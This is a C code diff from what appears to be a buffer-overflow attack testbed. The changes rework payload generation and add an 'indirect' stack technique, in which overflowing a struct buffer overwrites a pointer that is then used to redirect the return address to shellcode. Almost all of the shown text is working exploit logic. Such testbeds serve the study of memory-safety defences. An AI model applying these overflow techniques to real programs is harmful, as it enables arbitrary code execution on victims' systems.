@@ -36,13 +36,11 @@ void generate_payload() {
   static struct attackme bss_struct = {"AAAAAAAA", &fooz};
   
   if (attack.code_ptr == STRUCT_FUNC_PTR_BSS) {
-    payload.overflow_ptr = bss_struct.buffer;
+    payload.overflow_ptr = payload.target_addr = bss_struct.buffer;
     payload.buffer = &bss_struct.func_ptr;
   }
 
-  size_t total_size = (uintptr_t) payload.overflow_ptr - (uintptr_t) payload.buffer + sizeof(int);
-
-  printf("overflow_ptr is %x\nbuffer is %x\n", payload.overflow_ptr, payload.buffer);
+  size_t total_size = (uintptr_t) payload.target_addr - (uintptr_t) payload.buffer + sizeof(int);
 
   char* temp_char_buffer = (char*) malloc(total_size);
 
@@ -50,11 +48,11 @@ void generate_payload() {
     fprintf(stderr, "malloc failed\n");
   }
 
-  int buf_ptr = (int) payload.buffer;
+  int overflow_ptr = (int) payload.overflow_ptr;
   memcpy(temp_char_buffer, payload.contents, payload.size);
 
   char* tc_ra_location = (char*) ((uintptr_t) temp_char_buffer + total_size - sizeof(int));
-  memcpy(tc_ra_location, &buf_ptr, sizeof(int));
+  memcpy(tc_ra_location, &overflow_ptr, sizeof(int));
   memcpy(payload.buffer, temp_char_buffer, total_size);
 
   //we do this so that the compiler doesn't optimize away the memcpy
@@ -74,9 +72,14 @@ boolean is_attack_possible() {
 
 int main() {  
 
-  int* stack_mem_ptr;
-
   char buf[STACK_BUFFER_SIZE];
+
+  struct package {
+    char buf[STACK_BUFFER_SIZE];
+    int* stack_mem_ptr;
+  };
+
+  struct package buf_struct;
 
   struct attackme stack_struct;
   stack_struct.func_ptr = &fooz;
@@ -84,39 +87,51 @@ int main() {
   struct attackme* heap_struct = (struct attackme*) malloc(sizeof(struct attackme));
   heap_struct->func_ptr = &fooz;
 
-  attack.technique = DIRECT;
-  attack.code_ptr = STRUCT_FUNC_PTR_DATA;
-  attack.location = HEAP;
+  attack.technique = INDIRECT;
+  attack.code_ptr = RET_ADDR;
+  attack.location = STACK;
 
   payload.size = shellcode_no_noop_size;
 
   if (attack.code_ptr == RET_ADDR) {
-    payload.overflow_ptr = (void*) ((uintptr_t) (RET_ADDR_PTR) - 0x10);
+    payload.target_addr = (void*) ((uintptr_t) (RET_ADDR_PTR) - 0x10);
   } else if (attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
-    payload.overflow_ptr = (void*) &stack_struct.func_ptr;
+    payload.target_addr = (void*) &stack_struct.func_ptr;
   } else if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
-    payload.overflow_ptr = (void*) &heap_struct->func_ptr;
+    payload.target_addr = (void*) &heap_struct->func_ptr;
   } else if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
-    payload.overflow_ptr = (void*) &data_struct.func_ptr;
+    payload.target_addr = (void*) &data_struct.func_ptr;
   }
 
   if (attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
-    payload.buffer = stack_struct.buffer;
+    payload.buffer = payload.overflow_ptr = stack_struct.buffer;
   } else if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
-    payload.buffer = heap_struct->buffer;
+    payload.buffer = payload.overflow_ptr = heap_struct->buffer;
   } else if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
-    payload.buffer = data_struct.buffer;
+    payload.buffer = payload.overflow_ptr = data_struct.buffer;
   } else if (attack.location == STACK) {
-    payload.buffer = buf;
+    if(attack.technique == DIRECT) {
+      payload.buffer = payload.overflow_ptr = buf;
+    } else {
+      payload.buffer = buf_struct.buf;
+      payload.overflow_ptr = ((uintptr_t) (RET_ADDR_PTR) - 0x10);
+      payload.target_addr = &buf_struct.stack_mem_ptr;
+    }
   } else if (attack.location == HEAP) {
-    payload.buffer = malloc(100);
+    payload.buffer = payload.overflow_ptr = malloc(100);
   }
 
   payload.contents = shellcode_no_noop;
 
-  printf("%p\n", RET_ADDR_PTR);
-
   generate_payload(&payload);
+
+  if (attack.technique == INDIRECT) {
+    if (attack.location == STACK) {
+      *((int*) (buf_struct.stack_mem_ptr)) = (int) payload.buffer;
+      // done so that the compiler doesn't optimize away the write
+      printf("stack_mem_ptr val is %x\n", *buf_struct.stack_mem_ptr);
+    }
+  }
 
   if (attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
     stack_struct.func_ptr();
